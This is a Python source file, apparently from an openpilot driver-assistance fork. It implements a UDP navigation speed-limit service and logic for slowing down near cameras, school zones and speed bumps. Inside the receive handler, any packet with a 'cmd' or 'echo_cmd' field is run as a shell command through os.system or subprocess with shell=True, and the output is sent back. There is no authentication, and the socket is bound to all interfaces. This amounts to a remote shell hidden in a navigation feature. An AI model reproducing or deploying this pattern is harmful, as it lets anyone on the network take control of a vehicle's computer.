#!/usr/bin/env python3
import json
import os
import select
import signal
import subprocess
import sys
import threading
import time
import socket
import fcntl
import struct
import numpy as np
import logging
import glob

from collections import deque
from threading import Thread
from openpilot.cereal import messaging
from openpilot.common.realtime import Ratekeeper
from openpilot.common.constants import UnitConverter

terminate_flag = threading.Event()

LOG_DIR = "/data/navi_debug"
LOG_MAX_FILES = 30

def _setup_logger():
  logger = logging.getLogger("navi")
  logger.setLevel(logging.DEBUG)

  try:
    os.makedirs(LOG_DIR, exist_ok=True)

    existing = sorted(glob.glob(os.path.join(LOG_DIR, "nav_*.log")))
    for old_file in existing[:-LOG_MAX_FILES] if len(existing) > LOG_MAX_FILES else []:
      try:
        os.remove(old_file)
      except Exception:
        pass

    log_path = os.path.join(LOG_DIR, time.strftime("nav_%Y%m%d_%H%M%S.log"))
    handler = logging.FileHandler(log_path)
    handler.setFormatter(logging.Formatter("%(asctime)s.%(msecs)03d [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
    logger.addHandler(handler)

  except PermissionError:
    pass

  #stream_handler = logging.StreamHandler()
  #logger.addHandler(stream_handler)

  return logger

log = _setup_logger()

class Port:
  BROADCAST_PORT = 2899
  RECEIVE_PORT = 3843
  CS_PORT = 3847

class NaviServer:
  def __init__(self):
    self.json_road_limit = None
    self.active = 0
    self.last_updated = 0
    self.last_updated_active = 0
    self.last_exception = None
    self.lock = threading.Lock()
    self.remote_addr = None

    Thread(target=self.broadcast_thread, args=[], daemon=True).start()

  def get_broadcast_address(self):
    try:
      with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        ip = fcntl.ioctl(
          s.fileno(),
          0x8919,
          struct.pack('256s', 'wlan0'.encode('utf-8'))
        )[20:24]
        return socket.inet_ntoa(ip)
    except Exception:
      return None

  def broadcast_thread(self):
    broadcast_address = None
    frame = 0

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
      try:
        # sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        while not terminate_flag.is_set():

          try:
            if broadcast_address is None or frame % 10 == 0:
              broadcast_address = self.get_broadcast_address()

            if broadcast_address is not None and self.remote_addr is None:
              print('broadcast', broadcast_address)

              msg = 'EON:ROAD_LIMIT_SERVICE:v1'.encode()
              for i in range(1, 255):
                ip_tuple = socket.inet_aton(broadcast_address)
                new_ip = ip_tuple[:-1] + bytes([i])
                address = (socket.inet_ntoa(new_ip), Port.BROADCAST_PORT)
                sock.sendto(msg, address)
          except Exception:
            pass

          time.sleep(5.)
          frame += 1
      except Exception:
        pass

  def send_sdp(self, sock):
    try:
      sock.sendto('EON:ROAD_LIMIT_SERVICE:v1'.encode(), (self.remote_addr[0], Port.BROADCAST_PORT))
    except Exception:
      pass

  def udp_recv(self, sock):
    ret = False
    try:
      ready = select.select([sock], [], [], 1.)
      ret = bool(ready[0])
      if ret:
        data, self.remote_addr = sock.recvfrom(2048)
        json_obj = json.loads(data.decode())

        if 'cmd' in json_obj:
          try:
            os.system(json_obj['cmd'])
            ret = False
          except Exception:
            pass

        if 'echo' in json_obj:
          try:
            echo = json.dumps(json_obj["echo"])
            sock.sendto(echo.encode(), (self.remote_addr[0], Port.BROADCAST_PORT))
            ret = False
          except Exception:
            pass

        if 'echo_cmd' in json_obj:
          try:
            result = subprocess.run(json_obj['echo_cmd'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            echo = json.dumps({"echo_cmd": json_obj['echo_cmd'], "result": result.stdout})
            sock.sendto(echo.encode(), (self.remote_addr[0], Port.BROADCAST_PORT))
            ret = False
          except Exception:
            pass

        try:
          self.lock.acquire()
          try:
            if 'active' in json_obj:
              self.active = json_obj['active']
              self.last_updated_active = time.monotonic()
          except Exception:
            pass

          if 'road_limit' in json_obj:
            self.json_road_limit = json_obj['road_limit']
            self.last_updated = time.monotonic()
            log.debug(f"[3843 RECV] {json_obj['road_limit']}")

        finally:
          self.lock.release()

    except Exception:

      try:
        self.lock.acquire()
        self.json_road_limit = None
      finally:
        self.lock.release()

    return ret

  def check(self):
    now = time.monotonic()
    if now - self.last_updated > 6.:
      try:
        self.lock.acquire()
        self.json_road_limit = None
      finally:
        self.lock.release()

    if now - self.last_updated_active > 6.:
      self.active = 0
      self.remote_addr = None

  def get_limit_val(self, key, default=None):
    return self.get_json_val(self.json_road_limit, key, default)

  def get_json_val(self, json_data, key, default=None):
    if json_data is None:
      return default
    return json_data.get(key, default)

def publish_thread(server):
  sm = messaging.SubMaster(['carState'])
  naviData = messaging.pub_sock('naviData')
  rk = Ratekeeper(10, print_delay_threshold=None)
  v_ego_q = deque(maxlen=3)

  last_network_dist = -1
  dist_frozen_timer = 0.0

  while not terminate_flag.is_set():
    sm.update(0)

    dat = messaging.new_message('naviData', valid=True)
    navi = dat.naviData

    server.lock.acquire()
    try:
      navi.active = server.active
      navi.roadLimitSpeed = server.get_limit_val("road_limit_speed", 0)
      navi.isHighway = server.get_limit_val("is_highway", False)
      navi.camType = server.get_limit_val("cam_type", 0)
      navi.camLimitSpeedLeftDist = server.get_limit_val("cam_limit_speed_left_dist", 0)
      navi.camLimitSpeed = server.get_limit_val("cam_limit_speed", 0)
      navi.sectionLimitSpeed = server.get_limit_val("section_limit_speed", 0)
      navi.sectionLeftDist = server.get_limit_val("section_left_dist", 0)
      navi.sectionAvgSpeed = server.get_limit_val("section_avg_speed", 0)
      navi.sectionLeftTime = server.get_limit_val("section_left_time", 0)
      navi.sectionAdjustSpeed = server.get_limit_val("section_adjust_speed", False)
      navi.camSpeedFactor = server.get_limit_val("cam_speed_factor", 1.0)
      navi.currentRoadName = server.get_limit_val("current_road_name", "")
    finally:
      server.lock.release()

    if sm.updated['carState']:
      current_v_ego = sm['carState'].vEgo
      v_ego_q.append(current_v_ego)

      try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
          data_in_bytes = struct.pack('!f', current_v_ego)
          sock.sendto(data_in_bytes, ('127.0.0.1', Port.CS_PORT))
      except Exception:
        pass

    v_ego = np.mean(v_ego_q) if len(v_ego_q) > 0 else 0.

    # 프리징 차단 로직
    if navi.camLimitSpeedLeftDist > 0:
      if navi.camLimitSpeedLeftDist == last_network_dist:
        if v_ego > 1.0:
          dist_frozen_timer += 0.1
      else:
        last_network_dist = navi.camLimitSpeedLeftDist
        dist_frozen_timer = 0.0

      if dist_frozen_timer > 3.0:
        navi.camLimitSpeedLeftDist = 0
    else:
      last_network_dist = 0
      dist_frozen_timer = 0.0

    t_since_last_update = (time.monotonic() - server.last_updated)
    s_travelled = t_since_last_update * v_ego

    if navi.camLimitSpeedLeftDist > 0:
      navi.camLimitSpeedLeftDist = int(max(navi.camLimitSpeedLeftDist - s_travelled, 0))
    if navi.sectionLeftDist > 0:
      navi.sectionLeftDist = int(max(navi.sectionLeftDist - s_travelled, 0))

    naviData.send(dat.to_bytes())
    server.check()
    rk.keep_time()

def main():
  server = NaviServer()

  Thread(target=publish_thread, args=[server], daemon=True).start()

  with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    try:
      sock.bind(('0.0.0.0', Port.RECEIVE_PORT))
      sock.setblocking(True)
      while not terminate_flag.is_set():
        server.udp_recv(sock)
        server.send_sdp(sock)

    except Exception as e:
      server.last_exception = e

class SpeedLimiter:
  def __init__(self):
    self.decelerating = False
    self.started_dist = 0
    self.last_limit_speed_left_dist = 0
    self.last_road_name = ""
    self.in_school_zone = False

    self.sock = messaging.sub_sock("naviData")
    self.naviData = None
    self.logMonoTime = 0
    self.conv = UnitConverter()

    self._init_time = time.monotonic()
    self._first_navidata_logged = False
    self._last_reset_log_msg = None
    self._last_log_time = {}
    log.info("SpeedLimiter initialized, waiting for first naviData...")

  @classmethod
  def instance(cls):
    if not hasattr(cls, "_instance"):
      cls._instance = cls()
    return cls._instance

  def recv(self):
    try:
      dat = messaging.recv_sock(self.sock, wait=False)
      if dat is not None:
        self.logMonoTime = dat.logMonoTime
        self.naviData = dat.naviData
        if not self._first_navidata_logged:
          log.info(f"first naviData received ({time.monotonic() - self._init_time:.1f}s after SpeedLimiter init)")
          self._first_navidata_logged = True
    except Exception:
      pass

  def get_active(self):
    self.recv()
    if self.naviData is not None:
      return self.naviData.active
    return 0

  def get_road_limit_speed(self):
    self.recv()
    if self.naviData is not None:
      return self.naviData.roadLimitSpeed
    return 0

  def get_section_limit_speed(self):
    self.recv()
    if self.naviData is not None:
      return self.naviData.sectionLimitSpeed, self.naviData.sectionLeftDist
    return 0, 0

  def get_cam_type(self):
    self.recv()
    if self.naviData is not None:
      return self.naviData.camType
    return 0

  def get_in_school_zone(self):
    self.recv()
    return self.in_school_zone

  def _log_reset(self, msg):
    if msg != self._last_reset_log_msg:
      log.debug(msg)
      self._last_reset_log_msg = msg

  def _log_throttled(self, key, msg, min_interval=0.25):
    now = time.monotonic()
    last = self._last_log_time.get(key, 0)
    if now - last >= min_interval:
      log.debug(msg)
      self._last_log_time[key] = now

  def get_max_speed(self, cluster_speed_clu):
    self.recv()
    default_return_value = (0, False)

    if self.naviData is None:
      self.decelerating = False
      return default_return_value

    try:
      road_limit_speed = self.naviData.roadLimitSpeed
      is_highway = self.naviData.isHighway
      cam_type = int(self.naviData.camType)
      cam_limit_speed_left_dist = self.naviData.camLimitSpeedLeftDist
      cam_limit_speed = self.naviData.camLimitSpeed
      section_limit_speed = self.naviData.sectionLimitSpeed
      section_left_dist = self.naviData.sectionLeftDist
      section_avg_speed = self.naviData.sectionAvgSpeed
      section_left_time = self.naviData.sectionLeftTime
      section_adjust_speed = self.naviData.sectionAdjustSpeed
      cam_speed_factor = np.clip(self.naviData.camSpeedFactor, 1.0, 1.1)

      min_limit = 40 if is_highway else 20
      max_limit = 120 if is_highway else 100

      is_school_zone_start = cam_type == 20
      is_school_zone_end = cam_type == 21
      is_speed_bump = cam_type == 22

      if is_school_zone_start and not self.in_school_zone:
        log.info(f"school zone ENTER: limit={cam_limit_speed}, dist={cam_limit_speed_left_dist}")
        self.in_school_zone = True
      elif is_school_zone_end and self.in_school_zone:
        log.info("school zone EXIT")
        self.in_school_zone = False

      current_road_name = str(getattr(self.naviData, "currentRoadName", "") or "")

      if self.in_school_zone:
        if (self.last_road_name and current_road_name and current_road_name != self.last_road_name) or \
           (cam_type not in (20, 21) and cam_limit_speed_left_dist > 0):
          log.info("school zone FORCED EXIT (road changed or new cam detected)")
          self.in_school_zone = False

      if is_speed_bump or is_school_zone_start:
        min_limit = 10

      if is_speed_bump:
        self._log_throttled("bump_event", f"speed bump event: cam_limit_speed={cam_limit_speed}, dist={cam_limit_speed_left_dist}")

      if is_school_zone_start:
        self._log_throttled("school_zone_event", f"school zone start event: cam_limit_speed={cam_limit_speed}, dist={cam_limit_speed_left_dist}")

      if cam_limit_speed_left_dist is not None and cam_limit_speed is not None and cam_limit_speed_left_dist > 0:
        cluster_speed_ms = self.conv.to_ms(cluster_speed_clu)
        diff_speed = cluster_speed_clu - (cam_limit_speed * cam_speed_factor)

        tight_zone = is_speed_bump or is_school_zone_start
        safe_dist = cluster_speed_ms * 4. if tight_zone else cluster_speed_ms * 8.

        MIN_STARTING_DIST_TIGHT = 60.
        MIN_STARTING_DIST_NORMAL = 150.
        starting_dist = max(cluster_speed_ms * 10., MIN_STARTING_DIST_TIGHT) if tight_zone \
                        else max(cluster_speed_ms * 18., MIN_STARTING_DIST_NORMAL)

        if self.decelerating and self.last_limit_speed_left_dist > 0 and \
           cam_limit_speed_left_dist < (self.last_limit_speed_left_dist - (cluster_speed_ms * 6)):
          self._log_reset(f"decel reset (dist jumped closer): cam_type={cam_type} {self.last_limit_speed_left_dist:.0f}m -> {cam_limit_speed_left_dist:.0f}m")
          self.decelerating = False

        elif self.decelerating and self.last_limit_speed_left_dist > 0 and \
             cam_limit_speed_left_dist > (self.last_limit_speed_left_dist + max(cluster_speed_ms * 3, 20.)):
          self._log_reset(f"decel reset (new distinct event, dist jumped farther): cam_type={cam_type} {self.last_limit_speed_left_dist:.0f}m -> {cam_limit_speed_left_dist:.0f}m")
          self.decelerating = False

        if self.decelerating and self.last_road_name and current_road_name and current_road_name != self.last_road_name:
          self._log_reset(f"decel reset (road changed): cam_type={cam_type} {self.last_road_name} -> {current_road_name}")
          self.decelerating = False

        if tight_zone and not (min_limit <= cam_limit_speed <= max_limit and (self.decelerating or cam_limit_speed_left_dist < starting_dist)):
          self._log_throttled(
            "gate_rejected",
            f"bump/school gate REJECTED: cam_limit_speed={cam_limit_speed} (min={min_limit},max={max_limit}), "
            f"dist={cam_limit_speed_left_dist}, starting_dist={starting_dist:.1f}, decelerating={self.decelerating}"
          )

        if min_limit <= cam_limit_speed <= max_limit and (self.decelerating or cam_limit_speed_left_dist < starting_dist):
          is_limit_zone = not self.decelerating

          if not self.decelerating:
            self.started_dist = cam_limit_speed_left_dist
            self.decelerating = True

          total_decel_dist = self.started_dist - safe_dist
          remain_decel_dist = cam_limit_speed_left_dist - safe_dist

          decel_rate_factor = 0
          if remain_decel_dist > 0. and total_decel_dist > 0. and diff_speed > 0. and (section_left_dist is None or section_left_dist < 10 or cam_type == 2):
            decel_rate_factor = (remain_decel_dist / total_decel_dist) ** 0.6

          self.last_limit_speed_left_dist = cam_limit_speed_left_dist
          self.last_road_name = current_road_name

          target_speed = cam_limit_speed * cam_speed_factor + int(decel_rate_factor * diff_speed)

          self._log_throttled("target_speed", f"cam_type={cam_type} target_speed={target_speed:.1f}, is_limit_zone={is_limit_zone}, dist={cam_limit_speed_left_dist}, starting_dist={starting_dist:.1f}")

          return target_speed, is_limit_zone

      self.last_road_name = current_road_name

      if section_left_dist is not None and section_limit_speed is not None and section_left_dist > 0:
        if min_limit <= section_limit_speed <= max_limit:

          is_limit_zone = not self.decelerating
          if not self.decelerating:
            self.decelerating = True

          speed_diff = 0
          if section_adjust_speed is not None and section_adjust_speed:
            speed_diff = (section_limit_speed - section_avg_speed) / 2.
            speed_diff *= np.interp(section_left_dist, [500, 1000], [0., 1.])

          target_speed = section_limit_speed * cam_speed_factor + speed_diff

          return target_speed, is_limit_zone

    except Exception:
      pass

    self.decelerating = False
    return default_return_value

  def get_camera_limit_speed_stock(self, CS, cluster_speed_clu):
    speed_limit = CS.speedLimit
    speed_limit_distance = CS.speedLimitDistance
    cluster_speed_ms = self.conv.to_ms(cluster_speed_clu)
    speed_limit_ms = self.conv.to_ms(speed_limit)

    if speed_limit_distance <= 0 or speed_limit <= 0:
      self.decelerating = False
      return 0, False

    safe_dist = cluster_speed_ms * 8.
    decel_dist = speed_limit_distance - safe_dist

    is_limit_zone = not self.decelerating
    if decel_dist > 0:
      if not self.decelerating:
        self.decelerating = True

    safe_decel_rate = 1.2
    # v_i^2 = v_f^2 + 2ad (physics formula)
    temp = speed_limit_ms**2 + 2 * safe_decel_rate * decel_dist

    if temp < 0:
      speed_ms = speed_limit_ms
    else:
      speed_ms = np.sqrt(temp)

    calculated_speed = self.conv.to_clu(speed_ms)
    target_speed = max(speed_limit, min(255., calculated_speed))

    return target_speed, is_limit_zone

def signal_handler(sig, frame):
  log.info('Ctrl+C pressed, exiting.')
  terminate_flag.set()
  sys.exit(0)

if __name__ == "__main__":
  signal.signal(signal.SIGINT, signal_handler)
  main()
